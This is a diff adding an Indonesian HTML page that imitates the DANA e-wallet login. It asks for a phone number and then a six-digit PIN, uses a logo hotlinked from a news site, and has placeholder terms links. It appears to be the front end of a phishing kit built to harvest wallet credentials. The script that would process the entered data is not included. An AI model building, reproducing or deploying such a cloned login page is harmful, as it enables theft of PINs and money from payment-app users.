@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Halaman Dana</title>
+  <link rel="stylesheet" href="style.css"> <!-- Menghubungkan CSS -->
+</head>
+<body>
+  <div class="scrollable">
+    <div class="container" id="input-nomor">
+      <div class="logo">
+        <img src="https://cdn.antaranews.com/cache/1200x800/2022/04/25/dana.jpg" alt="DANA Logo">
+      </div>
+      <div class="title">Masukkan nomor HP kamu untuk lanjut</div>
+      <div class="input-row">
+        <div class="input-box" style="max-width: 120px;">
+          <div class="flag">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" alt="ID">
+          </div>
+          <input type="text" class="country-code-input" value="+62" disabled>
+        </div>
+        <div class="input-box">
+          <input type="tel" placeholder="811-1234-5678" id="phone-input">
+        </div>
+      </div>
+      <div id="phone-error">Nomor HP tidak valid</div>
+      <div id="error-message">Coba lagi dengan No. HP diawali dari angka 8</div>
+      <div class="info-text">
+        Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
+        Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&amp;K</a> serta <a href="#">Kebijakan Privasi</a> kami.
+      </div>
+      <button class="btn" onclick="showPinPage()">LANJUTKAN</button>
+    </div>
+
+    <div class="pin-page" id="pin-page">
+      <div class="pin-header">Masuk</div>
+      <div class="pin-title">Masukkan PIN</div>
+      <div class="pin-dots" id="pin-dots" onclick="document.getElementById('pin-input').focus()"></div>
+      <input type="tel" id="pin-input" maxlength="6" oninput="handlePinInput(this.value)" autofocus>
+      <div class="pin-help">
+        <div><img src="https://cdn-icons-png.flaticon.com/512/545/545705.png"> BUTUH BANTUAN?</div>
+        <div>LUPA PIN?</div>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script> <!-- Menghubungkan JavaScript -->
+</body>
+</html>
